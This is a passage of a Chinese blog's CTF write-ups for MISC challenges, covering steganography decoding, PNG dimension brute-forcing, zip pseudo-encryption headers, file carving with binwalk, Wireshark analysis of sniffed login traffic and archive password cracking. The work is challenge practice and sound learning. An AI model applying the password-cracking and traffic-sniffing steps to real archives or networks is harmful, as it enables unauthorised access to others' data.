class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 统计txt文件中给符号的频率。按降序排列</span><br><br>alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span><br><br>strings = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).read();<br><br>result = &#123;&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alphabet:<br>    counts = strings.count(i)<br>    <span class="hljs-comment"># i = &#x27;&#123;0&#125;&#x27;.format(i)</span><br>    result[i] = counts<br><br><br>res = <span class="hljs-built_in">sorted</span>(result.items(),key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-number">1</span>],reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(data)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:   <span class="hljs-comment">#将结果一行输出</span><br>    flag = <span class="hljs-built_in">str</span>(i[<span class="hljs-number">0</span>])<br>    <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>使用大神脚本，可以得到：频率降序排列字符</p><p><img src="https://s2.loli.net/2022/12/28/1jmu3eG4wMbEVR9.png" alt="image-20221228231000168"></p><p>前面几个几位flag</p><h2 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h2><p>观察题目，并查阅资料，我们了解到 <code>base64隐写</code> 这么个东西</p><p>我们打开txt文件，发现很多base64编码：</p><img src="https://s2.loli.net/2022/12/29/73PmXdv5fRsZcYS.png" alt="image-20221229094352736" style="zoom:33%;" /><p>要是我们直接去解码的话，结果是不对的，只有一小串base64被解出来。</p><p>我们参考网上大佬写的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base64_diff_value</span>(<span class="hljs-params">s1, s2</span>):<br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(s2)):<br>        <span class="hljs-keyword">if</span> s1[i] != s2[i]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_stego</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;base64.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_lines = f.readlines()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_lines:<br>            steg_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = get_base64_diff_value(steg_line, norm_line)<br>            <span class="hljs-built_in">print</span> diff<br>            pads_num = steg_line.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-keyword">if</span> diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].zfill(pads_num * <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">else</span>:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span> goflag(bin_str)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">goflag</span>(<span class="hljs-params">bin_str</span>):<br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res_str<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve_stego()<br><br></code></pre></td></tr></table></figure><p>运行时，我们在python2环境下，我们使用dos来运行：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">Applications</span>\<span class="hljs-title">CTF</span>\<span class="hljs-title">phpstudy_pro</span>\<span class="hljs-title">WWW</span>\<span class="hljs-title">scripts_py</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">base64_diff_value.py</span></span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/29/wLrhtOzpST9diJm.png" alt="image-20221229094727645" style="zoom: 50%;" /><p>结果跑出来了</p><h2 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h2><img src="https://s2.loli.net/2022/12/29/xGmtejF7pVZAbfP.png" alt="image-20221229094949110" style="zoom:33%;" /><p>打开txt，发现很多 ook ，于是想起了 ook编码，<a href="https://www.splitbrain.org/services/ook">ook解密</a></p><img src="https://s2.loli.net/2022/12/29/1vONgbA7hk8ICax.png" alt="image-20221229095056984" style="zoom:33%;" /><p>使用网站解密即可。</p><h2 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h2><p>将图片使用 010Editor 打开，发现crc校验失败：</p><img src="https://s2.loli.net/2022/12/29/1IbTh2CBfnFiMoH.png" alt="image-20221229102415636" style="zoom: 25%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br> <br>m = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\LIKE\\Desktop\\flag.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>        c = m[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j) + m[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc = binascii.crc32(c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc == <span class="hljs-number">0x370c8f0b</span>:<br>            k = <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>使用脚本跑一下，算出宽高：</p><img src="https://s2.loli.net/2022/12/29/FMHZPreyGTQ5Sxj.png" alt="image-20221229102524745" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/29/FDqiwkm6LygAx7E.png" alt="image-20221229102558459" style="zoom:33%;" /><p>修改一下得到flag</p><h2 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h2><p>将txt文件使用 010Editor 打开，然后更换编码为： <code>EBCDIC</code></p><img src="https://s2.loli.net/2022/12/29/r2OLszYZedITKH7.png" alt="image-20221229103128288" style="zoom:33%;" /><p>发现可以正常显示了：</p><img src="https://s2.loli.net/2022/12/29/s9dlwVavfCNIcEu.png" alt="image-20221229103239863" style="zoom:33%;" /><p>然后使用此密码去解压压缩包，发现文件夹里面有很多跳舞的小人：</p><p><img src="https://s2.loli.net/2022/12/29/jvkV1iHOtyIYp3T.png" alt="image-20221229103350999"></p><p>我们经过查阅，发现有一个<code>福尔莫斯跳舞的小人密码</code></p><p><img src="https://s2.loli.net/2022/12/29/cZA1MCrqdsU6YxQ.jpg" alt="img"></p><p>对照一下，得到flag</p><h2 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h2><blockquote><p>hint：Jack很喜欢看黑客帝国电影，一天他正在上网时突然发现屏幕不受控制，出现了很多数据再滚屏，结束后留下了一份神秘的数据文件，难道这是另一个世界给Jack留下的信息？聪明的你能帮Jack破解这份数据的意义吗？</p></blockquote><p>打开txt文件，发现很多16进制：</p><p><img src="https://s2.loli.net/2022/12/29/XWsjiHK2N7fLTde.png" alt="image-20221229103958975"></p><p>发现前面的数字好像是rar文件头</p><p>由于这都是16进制的，我们想要得到rar压缩包必须使用二进制，所以我们可以写一个脚本实现转换为2进制</p><blockquote><h4 id="关于二进制转换"><a href="#关于二进制转换" class="headerlink" title="关于二进制转换"></a>关于二进制转换</h4><p>　　binascii.b2a_hex(data)和binascii.hexlify(data)：返回二进制数据的十六进制表示。每个字节被转换成相应的2位十六进制表示形式。因此，得到的字符串是是原数据长度的两倍。 </p><p>　　binascii.a2b_hex(hexstr) 和**binascii.unhexlify(hexstr)**：从十六进制字符串hexstr返回二进制数据。是b2a_hex的逆向操作。 hexstr必须包含偶数个十六进制数字（可以是大写或小写），否则报TypeError。 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-comment"># 16进制转图片</span><br>hex_data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users//LIKE//Desktop//flag.txt&quot;</span>).read()<br>out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.rar&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>out.write(binascii.unhexlify(hex_data))<br>out.close()<br></code></pre></td></tr></table></figure><p>运行后得到rar压缩包，发现需要密码，我们爆破即可得到密码。解压一下得到一张打不开的png图片</p><p>使用 010Editor 打开：</p><img src="https://s2.loli.net/2022/12/29/V8BfwGtpMbqTzyl.png" alt="image-20221229105736644" style="zoom:33%;" /><p>发现图片末尾是 <code>FF D9</code>  说明图片可能是 jpg图片，我们改一下文件头为 <code>FF D8</code></p><img src="https://s2.loli.net/2022/12/29/zunxAM5Eb6ef8KB.png" alt="image-20221229105844217" style="zoom:33%;" /><p>就可以正常打开了</p><h2 id="MRCTF2020-你能看懂音符吗"><a href="#MRCTF2020-你能看懂音符吗" class="headerlink" title="[MRCTF2020]你能看懂音符吗"></a>[MRCTF2020]你能看懂音符吗</h2><p>使用 010Editor 打开压缩包，发现</p><img src="https://s2.loli.net/2022/12/29/TxgMWkKlaXz912F.png" alt="image-20221229110041883" style="zoom: 50%;" /><p>rar文件头反了，改一下：<code>52 61 72 21</code></p><p>解压rar，发现一个文档，打开：</p><p><img src="https://s2.loli.net/2022/12/29/CS7nwUT5drFKEsj.png" alt="image-20221229110610632"></p><p>发现里面很多音符，但是好像复制不了。。</p><p>于是我们使用 010Editor 打开：</p><img src="https://s2.loli.net/2022/12/29/v7csZgDfCpkAjS2.png" alt="image-20221229110748443" style="zoom:33%;" /><p>发现是zip压缩包。然后后缀改成 zip，解压一下，有很多文件。</p><p>我们在 这个文件中发现了音符：</p><img src="https://s2.loli.net/2022/12/29/N9urQXBWjlVx4Jq.png" alt="image-20221229111055959" style="zoom: 25%;" /><p>我们查询资料得知，有一种<code>音符编码</code>  <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">直接解密</a> 一下就行</p><p><img src="https://s2.loli.net/2022/12/29/LF8o1UWETdxqDsM.png" alt="image-20221229111257307"></p><h2 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h2><img src="https://s2.loli.net/2022/12/29/VgHxPky4B7GCROJ.png" alt="image-20221229111500501" style="zoom:33%;" /><p>打开文件，题目是 : <code>caesar</code> 就是凯撒的意思，于是我们知道，这是凯撒密码，直接解密就行：</p><p>我使用 <code>CTFCrack</code> 解密：</p><img src="https://s2.loli.net/2022/12/29/O1DwgylCrMYKTuc.png" alt="image-20221229111650375" style="zoom:33%;" /><h2 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h2><img src="https://s2.loli.net/2022/12/29/tvb7FheWHc4SdwN.png" alt="image-20221229111806704" style="zoom:33%;" /><p>题目说<code>低个头</code> ，并且有一些字母，我知道这个是键盘加密，但是由于之前只遇到过：键盘包围得出字母的题目，一时间不知道这是什么东西。</p><p>然后查资料知道了，这个是很多字母去组成字母的情况，然后就可以知道flag了：</p><p><img src="https://s2.loli.net/2022/12/29/4aLGZv57uRidjlV.png" alt="在这里插入图片描述"></p><p><img src="https://s2.loli.net/2022/12/29/XUjlHDLVK2OhzdJ.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC(第2页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC(第1页wp)</title>
    <link href="/2023/08/24/MISC(%E7%AC%AC1%E9%A1%B5wp)/"/>
    <url>/2023/08/24/MISC(%E7%AC%AC1%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag直接给了</p><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>下载附件，有一个gif动画，flag藏在动画里，我们可以使用 <code>StegSolve</code> 软件的 <code>Frame Browser</code> 模式，逐帧读取获得flag</p><img src="https://s2.loli.net/2022/12/27/GQdaCqHWuFhM43E.png" alt="image-20221227215854057" style="zoom: 33%;" /><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载后得到一个二维码，我们先用 <code>QR Research</code> 扫一下：</p><img src="https://s2.loli.net/2022/12/27/UuDJ4TZ6Mw9cRrf.png" alt="image-20221227220214403" style="zoom: 25%;" /><p>没有什么有用的信息，我们将图片拖到 <code>010Editor</code> 中：</p><img src="https://s2.loli.net/2022/12/27/4Fedt8zBXubkqVW.png" alt="image-20221227220338212" style="zoom:33%;" /><p>我们发现在png图片的结尾( <code>AE 42 60 82</code> ) 后面藏有zip文件，zip文件头(<code>50 4B 03 04</code>) </p><p>我们将其分离出来，保存成zip文件：</p><img src="https://s2.loli.net/2022/12/27/ji4GhnlxkoI2D53.png" alt="image-20221227220652935" style="zoom:33%;" /><p>我们打开zip，里面有一个txt文件，但是被加密了，我们使用 <code>Ziperello</code> 进行暴力破解zip(使用纯数字)</p><img src="https://s2.loli.net/2022/12/27/g7QKNFC9HB6b1PR.png" alt="image-20221227220955009" style="zoom:33%;" /><p>得到zip文件的密码，打开文件得到flag</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>把图片放到 <code>010Editor</code> 拖到最下面就看到了flag(藏在文件结尾)</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><blockquote><p>hint : 看不到图？  是不是屏幕太小了</p></blockquote><p>根据提示，可能图片高度不够，我们修改一下高度得到flag</p><img src="https://s2.loli.net/2022/12/27/rjLCIRSQachbgEo.png" alt="image-20221227221918280" style="zoom: 50%;" /><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>把exe文件使用 <code>010Editor</code> 打开，发现内容是 data伪协议，将其中编码部分使用base64解码</p><img src="https://s2.loli.net/2022/12/27/iTKbsMGWSakdUto.png" alt="image-20221227222137183" style="zoom:33%;" /><p>使用 <a href="https://the-x.cn/base64">base64解密</a> 进行解密：</p><p><img src="https://s2.loli.net/2022/12/27/FWxpHbP2X694hDc.png" alt="image-20221227222311162"></p><p>我们发现内容为 png 文件的16进制形式，使用 010Editor 保存为图片(或使用网站另存为png功能)，得到一个二维码，使用 QR 去扫得到flag</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>将图片用 010Editor 打开，flag在文件末尾</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><blockquote><p>hint: 给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。</p></blockquote><p>根据提示，rar压缩包是4位数字加密，我们使用 <code>ARCHPR</code> 爆破</p><img src="https://s2.loli.net/2022/12/27/BvoDcGVWstxS2lL.png" alt="image-20221227230309747" style="zoom: 33%;" /><p>打开txt后，将字符串base64解密即可</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><blockquote><p>hint: 黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)</p></blockquote><p>下载后得到一个 <code>.pcap </code>后缀文件(一种数据包)，我们可以在 <code>kali</code> 中利用自带的<code>wireshark</code> 打开并分析数据流：</p><p><img src="https://s2.loli.net/2022/12/27/Ef5vcZH1iURKqwJ.png" alt="image-20221227231107251"></p><p>由于提示我们说：是登录网站的流量包，所以我们可以判断应该是 <code>http</code> 协议，使用过滤器只包含http：<code>http</code></p><img src="https://s2.loli.net/2022/12/27/7vsNqeckKPaIEyV.png" alt="image-20221227231759804" style="zoom:33%;" /><p>发现了login的流量包，我们选中，然后右击-&gt;追踪流-&gt;http流：</p><p><img src="https://s2.loli.net/2022/12/27/ArNm7PpCGDk3YK8.png" alt="image-20221227231604274"></p><p>可以看到flag：</p><img src="https://s2.loli.net/2022/12/27/mXV8pOBbF6e5fLJ.png" alt="image-20221227231720263" style="zoom:33%;" /><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>打开图片属性-&gt;详细信息</p><img src="https://s2.loli.net/2022/12/27/Ct3gc9DdjaHsEYq.png" alt="image-20221227232047478" style="zoom:33%;" /><p>flag在图片<code>exif</code>中</p><h4 id="图片exif"><a href="#图片exif" class="headerlink" title="图片exif"></a>图片exif</h4><p><img src="https://s2.loli.net/2022/12/27/vrdsu2hTmBtKSGZ.png" alt="image-20221227232308343"></p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>根据LSB我们想到了</p><h4 id="LSB隐写（最低有效位隐写）："><a href="#LSB隐写（最低有效位隐写）：" class="headerlink" title="LSB隐写（最低有效位隐写）："></a>LSB隐写（最低有效位隐写）：</h4><blockquote><p>LSB 全称为 least significant bit，是最低有效位的意思。Lsb 图片隐写是基于 lsb 算法的一种图片隐写术，</p></blockquote><p><a href="https://segmentfault.com/a/1190000016223897">参考文章</a></p><p>我们首先下载到一张图片，放到 <code>StegSolve</code> 中分析，使用 <code>Data Extract</code> 模式</p><img src="https://s2.loli.net/2022/12/27/nHIShXTveNEMBu9.png" alt="image-20221227233548973" style="zoom:33%;" /><p>LSB是最低有效位隐写，所以我们只需要最低位数据就行：</p><p>选择rgb最低位后，点击<code>preview</code>，发现生成了png16进制数据，我们点击 <code>sava bin</code>保存为png图片即可。</p><img src="https://s2.loli.net/2022/12/27/TnIvVp5WGERus9j.png" alt="image-20221227233656255" style="zoom:33%;" /><p>发现图片是二维码，使用QR扫一下得到flag</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>我们下载了一个压缩包，发现打不开，被加密了，根据题目我们知道是zip伪加密。</p><p>直接使用 <code>010Editor</code> 打开</p><img src="https://s2.loli.net/2022/12/27/M1JAwv52HCyz3ZI.png" alt="img" style="zoom: 67%;" /><p><strong>未加密：</strong></p><blockquote><p>文件头中的全局方式位标记为00 00</p><p> 目录中源文件的全局方式位标记为00 00</p></blockquote><p><strong>伪加密：</strong></p><blockquote><p>文件头中的全局方式位标记为00 00</p><p>目录中源文件的全局方式位标记为09 00</p></blockquote><p><strong>真加密：</strong></p><blockquote><p>文件头中的全局方式位标记为09 00</p><p>目录中源文件的全局方式位标记为09 00</p></blockquote><p>ps:也不一定要09 00或00 00，只要是奇数都视为加密，而偶数则视为未加密</p><p>这一题虽然两处都是 <code>09 00</code> ，但是却是伪加密(迷惑人)都修改为 <code>00 00</code>  即可打开txt</p><hr><h3 id="ZIP-文件由三个部分组成："><a href="#ZIP-文件由三个部分组成：" class="headerlink" title="ZIP 文件由三个部分组成："></a>ZIP 文件由<strong>三个部分</strong>组成：</h3><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><h4 id="压缩源文件数据区："><a href="#压缩源文件数据区：" class="headerlink" title="压缩源文件数据区："></a><strong>压缩源文件数据区</strong>：</h4><p>50 4B 03 04：这是头文件标记（0x04034b50）</p><p>14 00：解压文件所需 pkware 版本</p><p>00 00：全局方式位标记（<strong>有无加密</strong>）</p><p>08 00：压缩方式</p><p>5A 7E：最后修改文件时间</p><p>F7 46：最后修改文件日期</p><p>16 B5 80 14：CRC-32校验（1480B516）</p><p>19 00 00 00：压缩后尺寸（25）</p><p>17 00 00 00：未压缩尺寸（23）</p><p>07 00：文件名长度</p><p>00 00：扩展记录长度</p><h4 id="压缩源文件目录区："><a href="#压缩源文件目录区：" class="headerlink" title="压缩源文件目录区："></a><strong>压缩源文件目录区</strong>：</h4><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本</p><p>00 00：全局方式位标记（<strong>有无加密，这个更改这里进行伪加密</strong>，改为09 00打开就会提示有密码了）</p><p>08 00：压缩方式</p><p>5A 7E：最后修改文件时间</p><p>F7 46：最后修改文件日期</p><p>16 B5 80 14：CRC-32校验（1480B516）</p><p>19 00 00 00：压缩后尺寸（25）</p><p>17 00 00 00：未压缩尺寸（23）</p><p>07 00：文件名长度</p><p>24 00：扩展字段长度</p><p>00 00：文件注释长度</p><p>00 00：磁盘开始号</p><p>00 00：内部文件属性</p><p>20 00 00 00：外部文件属性</p><p>00 00 00 00：局部头部偏移量</p><h4 id="压缩源文件目录结束标志："><a href="#压缩源文件目录结束标志：" class="headerlink" title="压缩源文件目录结束标志："></a><strong>压缩源文件目录结束标志</strong>：</h4><p>50 4B 05 06：目录结束标记</p><p>00 00：当前磁盘编号</p><p>00 00：目录区开始磁盘编号</p><p>01 00：本磁盘上纪录总数</p><p>01 00：目录区中纪录总数</p><p>59 00 00 00：目录区尺寸大小</p><p>3E 00 00 00：目录区对第一张磁盘的偏移量</p><p>00 00：ZIP 文件注释长度</p><hr><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>使用 <code>ARCHPR</code> 爆破得到flag</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><blockquote><p>hint： 某黑客潜入到某公司内网通过嗅探抓取了一段<strong>文件传输的数据</strong>，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？</p></blockquote><p>下载 <code>pcapng</code> 文件后 ，放在<code>wireshark</code> 分析，由于是文件传输，我们找 http 协议的post包</p><p>首先进行过滤：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http.request.method<span class="hljs-operator">=</span><span class="hljs-operator">=</span>POST// 记得是两个等号<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/28/riKOZkLDQJeU43a.png" alt="image-20221228102011547"></p><p>然后右键追踪http流，在末尾找到flag</p><img src="https://s2.loli.net/2022/12/28/fuHw5Q6dXBrEscP.png" alt="image-20221228102056380" style="zoom:33%;" /><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>扫一下二维码就行</p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>下载得到图片： <code>steg.png</code> 并且图片内容：</p><img src="https://s2.loli.net/2022/12/28/Qo1RYr6qxTc3JEM.png" alt="image-20221228103036984" style="zoom:25%;" /><p>于是我们猜测，可能用到 <code>stegsolve</code> 工具，LSB隐写</p><img src="https://s2.loli.net/2022/12/28/oMDl8ExOCGzWrj6.png" alt="image-20221228103132665" style="zoom:33%;" /><p>使用 <code>Data Extract</code> 模式</p><img src="https://s2.loli.net/2022/12/28/8PwZFJT3viqCuaM.png" alt="image-20221228103222809" style="zoom:33%;" /><p>调整为最低位可见，得到flag</p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><blockquote><p>hint: 人类的科学日益发展，对自然的研究依然无法满足，传闻日本科学家秋明重组了基因序列，造出了名为ningen的超自然生物。某天特工小明偶然截获了日本与俄罗斯的秘密通信，文件就是一张ningen的特写，小明通过社工，知道了秋明特别讨厌中国的六位银行密码，<strong>喜欢四位数</strong>。你能找出黑暗科学家秋明的秘密么？</p></blockquote><p>下载后得到一张图片，放到 <code>010Editor</code> 分析 发现末尾隐藏 zip文件：</p><img src="https://s2.loli.net/2022/12/28/OxBo4iqr7LIuAUW.png" alt="image-20221228103559428" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/28/vkPjYz3nw79Zxco.png" alt="image-20221228103629615" style="zoom: 50%;" /><p>我们新建16进制文件，将16进制zip粘贴进去，另存为zip：</p><img src="https://s2.loli.net/2022/12/28/l1xhbnZsDuMgOG4.png" alt="image-20221228103806545" style="zoom:25%;" /><p>得到zip压缩包，需要密码，根据hint，密码为四位数，我们使用 <code>Ziperello</code> 进行爆破：</p><img src="https://s2.loli.net/2022/12/28/ydDNezFmRvqLPsa.png" alt="image-20221228103948750" style="zoom:33%;" /><p>得到密码，打开文件得到flag</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><blockquote><p>hint: 小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。（答案格式：flag｛答案｝，只需提交答案）</p></blockquote><img src="https://s2.loli.net/2022/12/28/RgJuODoqUc3Br4M.png" alt="image-20221228104211899" style="zoom:33%;" /><p>下载后，得到jpg图片，图片末尾隐藏 rar 压缩包</p><img src="https://s2.loli.net/2022/12/28/yMAfV2xI4Fvw8cu.png" alt="image-20221228104422776" style="zoom: 33%;" /><p>这一次，我们使用kali 中的 <code>foremost</code> 或者 <code>binwalk</code> 自动分离图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs linux">foremost a.jpg<br>或<br>binwalk -e a.jpg --run-as=root<br></code></pre></td></tr></table></figure><p>这样就得到了分离出的rar压缩包：</p><p>使用 <code>ARCHPR</code> 爆破得到 压缩包密码</p><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>下载图片后，使用 binwalk 分离图片隐藏的压缩包：</p><img 